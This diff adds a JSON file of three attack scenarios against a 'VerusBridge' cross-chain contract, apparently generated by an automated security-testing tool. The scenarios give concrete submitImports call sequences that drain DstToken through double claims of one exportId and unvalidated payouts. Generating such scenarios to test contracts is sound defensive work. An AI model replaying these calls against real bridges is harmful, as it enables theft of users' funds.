@@ -1,0 +1,110 @@
+{
+  "bridge_name": "verus",
+  "scenarios": [
+    {
+      "scenario_id": "scenario_1",
+      "target_invariant": "inv_authorization",
+      "vulnerability_class": "authorization",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Call submitImports repeatedly (or with a large payout) for an already recorded exportId, draining DstToken from the bridge without proper source verification."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call submitImports repeatedly (or with a large payout) for an already recorded exportId, draining DstToken from the bridge without proper source verification."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_double_claim",
+      "target_invariant": "inv_uniqueness",
+      "vulnerability_class": "missing-claim-check",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "First claim of the export; bridge transfers 500 tokens to attacker."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Second claim of the same exportId, exploiting missing uniqueness check to receive another 500 tokens."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First claim of the export; bridge transfers 500 tokens to attacker."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second claim of the same exportId, exploiting missing uniqueness check to receive another 500 tokens."
+        }
+      ]
+    },
+    {
+      "scenario_id": "cross_chain_bridge_overpay",
+      "target_invariant": "inv_state_consistency",
+      "vulnerability_class": "missing payout validation",
+      "confidence": 0.97,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Call submitImports with a valid exportId (already recorded by the relayer) but request a payout larger than the source amount, exploiting the empty checkCCEValues to extract excess DstToken."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call submitImports with a valid exportId (already recorded by the relayer) but request a payout larger than the source amount, exploiting the empty checkCCEValues to extract excess DstToken."
+        }
+      ]
+    }
+  ]
+}
